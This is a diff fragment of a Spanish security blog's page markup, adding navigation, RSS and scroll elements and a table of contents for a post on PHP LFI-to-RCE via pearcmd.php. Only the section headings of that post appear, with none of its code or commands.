2.289.725-2.736 2.983-10.015h4.526v17.063zm17.64 0-1.44-4.359h-6.184l-1.44 4.359h-3.397l5.919-17.063h4.007l5.896 17.063zm-4.537-14.434-.069.267q-.115.436-.277.993c-.162.557-.767 2.414-1.98 6.128h4.663l-1.601-4.905-.495-1.647zm24.577 5.776q0 2.64-.99 4.614-.979 1.961-2.787 3.003-1.796 1.042-4.122 1.042h-6.564V22.313h5.873q4.099 0 6.345 2.18 2.245 2.167 2.245 6.224m-3.42 0q0-2.748-1.359-4.19-1.359-1.453-3.881-1.453h-2.407v11.54h2.879q2.188 0 3.478-1.586t1.29-4.311m6 8.659V22.313h12.759v2.761h-9.362v4.287h8.66v2.761h-8.66v4.492h9.835v2.761zm15.75 0v-3.693h3.328v3.693zm12.445-12.149q2.082 0 3.662.781 1.58.78 2.422 2.235.833 1.454.833 3.393 0 2.98-1.845 4.676Q124.302 40 121.085 40q-3.208 0-5.005-1.688-1.798-1.688-1.798-4.695c0-3.007.606-3.57 1.817-4.694q1.817-1.696 4.986-1.696m0 2.702q-2.157 0-3.378.97-1.23.97-1.23 2.72 0 1.777 1.22 2.747 1.211.97 3.388.97 2.195 0 3.462-.988 1.258-.997 1.258-2.711 0-1.778-1.23-2.738-1.23-.97-3.491-.97m6.725-13.402-5.062 2.935v3.107h5.062v2.648h-13.331v-6.322q0-2.261 1.031-3.491 1.022-1.23 2.942-1.23 1.4 0 2.422.754 1.012.754 1.334 2.038l5.601-3.42zm-9.244.314q-1.92 0-1.921 2.334v3.393h3.936v-3.465q0-1.113-.53-1.688t-1.486-.575m7.249-10.915a6.5 6.5 0 0 0-.313-2.002q-.321-.969-.814-1.499h-1.845v3.088h-2.063V0h4.901q1.088 1.005 1.703 2.622a9.4 9.4 0 0 1 .615 3.375q0 3.088-1.798 4.748-1.808 1.661-5.119 1.661-3.292 0-5.043-1.67-1.76-1.67-1.76-4.803 0-4.452 3.473-5.664l.776 2.442q-1.012.395-1.533 1.238-.52.844-.52 1.984 0 1.867 1.192 2.837t3.416.97q2.261 0 3.501-.997 1.23-1.005 1.23-2.818z" />
    </svg></abbr></a></div>
 
+<div class="related-posts thin">
+	<h2>Vea también</h2>
+	<ul>
+	
+	<li><a href="/es/posts/phplfi2rce/">Vulnerabilidad en PHP hasta 7.3. LFI to RCE</a></li>
+	
+	<li><a href="/es/posts/phplfitorce/">Vulnerabilidad en PHP hasta 7.3. LFI to RCE</a></li>
+	
+	</ul>
+</div>
+
 		</article>
+		<aside id="toc">
+			<div class="toc-title">Tabla de Contenido</div>
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-objetivo">1. Objetivo</a>
+      <ul>
+        <li><a href="#11-laboratorio-local">1.1. Laboratorio local</a></li>
+        <li><a href="#12-blog-de-origen">1.2. Blog de origen</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-creando-nuestro-laboratorio-local">2. Creando nuestro Laboratorio Local</a>
+      <ul>
+        <li><a href="#21-archivos-y-contenedores">2.1. Archivos y contenedores</a></li>
+        <li><a href="#22-contenedor">2.2. Contenedor</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-variables-argc-y-argv">3. Variables argc y argv</a>
+      <ul>
+        <li><a href="#31-qué-ha-sucedido">3.1. Qué ha sucedido</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-acerca-del-archivo-pearcmdphp">4. Acerca del archivo pearcmd.php</a>
+      <ul>
+        <li><a href="#41-cuál-es-la-idea">4.1. Cuál es la idea</a></li>
+        <li><a href="#42-veamos-el-archivo-desde-dentro-del-contenedor">4.2. Veamos el archivo desde dentro del contenedor</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-ejecución-de-pearcmdphp">5. Ejecución de pearcmd.php</a>
+      <ul>
+        <li><a href="#51-opción-1---utilizar-el-navegador-para-hacer-el-request-y-crear-un-archivo-dentro-del-contenedor">5.1. Opción 1 - Utilizar el navegador para hacer el request y crear un archivo dentro del contenedor</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos">6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos</a>
+      <ul>
+        <li><a href="#61-comandos-de-sistema">6.1. Comandos de sistema</a></li>
+        <li><a href="#62-reverse-shell">6.2. Reverse shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI</a>
+      <ul>
+        <li><a href="#71-usaremos-curl-para-crear-el-archivo">7.1. Usaremos curl para crear el archivo</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</a>
+      <ul>
+        <li><a href="#81-testing-usando-nuestro-hackpy">8.1. Testing usando nuestro hack.py</a></li>
+        <li><a href="#82-ejecución-remota-de-comandos">8.2. Ejecución remota de comandos</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+		</aside>
 		<div class="post-nav thin">
+			<a class="next-post" href="https://maxibelino.github.io/es/posts/phplfitorce/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left">
+      <line x1="19" y1="12" x2="5" y2="12"></line>
+      <polyline points="12 19 5 12 12 5"></polyline>
+   </svg>&nbsp;Siguiente</span><br><span>Vulnerabilidad en PHP hasta 7.3. LFI to RCE</span>
+			</a>
 		</div>
 		<div id="comments" class="thin"></div>
 	</main>
@@ -238,10 +739,42 @@
 <footer id="site-footer" class="section-inner thin animated fadeIn faster">
 	<p>
 		&copy; 2024 <a href="/es/">m4xth0r</a>
-		&#183;  <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		&#183;  <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a>
+		&#183; <a href="https://maxibelino.github.io/es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+   stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss">
+   <path d="M4 11a9 9 0 0 1 9 9"></path>
+   <path d="M4 4a16 16 0 0 1 16 16"></path>
+   <circle cx="5" cy="19" r="1"></circle>
+</svg></a></p>
 
 </footer>
 
+
+<a href="#" class="scroll-up"><svg class="scroll" xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8"
+   stroke-width="0">
+   <g id="st-ring" stroke-linecap="round" stroke-linejoin="round" stroke-width=".96">
+      <circle cx="12" cy="12" r="10" />
+      <path
+         d="M15 14a1 1 0 0 1-.71-.29L12 11.41l-2.29 2.3a1 1 0 0 1-1.42-1.42l3-3a1 1 0 0 1 1.42 0l3 3a1 1 0 0 1 0 1.42A1 1 0 0 1 15 14" />
+   </g>
+   <circle id="st-circle" cx="12" cy="12" r="10" />
+   <path id="st-arrow"
+      d="M15 14a1 1 0 0 1-.71-.29L12 11.41l-2.29 2.3a1 1 0 0 1-1.42-1.42l3-3a1 1 0 0 1 1.42 0l3 3a1 1 0 0 1 0 1.42A1 1 0 0 1 15 14Z" />
+</svg></a>
+<noscript>
+    <a href="#" class="scroll-up show"><svg class="scroll" xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8"
+   stroke-width="0">
+   <g id="st-ring" stroke-linecap="round" stroke-linejoin="round" stroke-width=".96">
+      <circle cx="12" cy="12" r="10" />
+      <path
+         d="M15 14a1 1 0 0 1-.71-.29L12 11.41l-2.29 2.3a1 1 0 0 1-1.42-1.42l3-3a1 1 0 0 1 1.42 0l3 3a1 1 0 0 1 0 1.42A1 1 0 0 1 15 14" />
+   </g>
+   <circle id="st-circle" cx="12" cy="12" r="10" />
+   <path id="st-arrow"
+      d="M15 14a1 1 0 0 1-.71-.29L12 11.41l-2.29 2.3a1 1 0 0 1-1.42-1.42l3-3a1 1 0 0 1 1.42 0l3 3a1 1 0 0 1 0 1.42A1 1 0 0 1 15 14Z" />
+</svg></a>
+</noscript>
+<script async src="https://maxibelino.github.io/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js" integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin="anonymous"></script>
 <script async src="https://maxibelino.github.io/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="https://maxibelino.github.io/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script>
 </body>
 
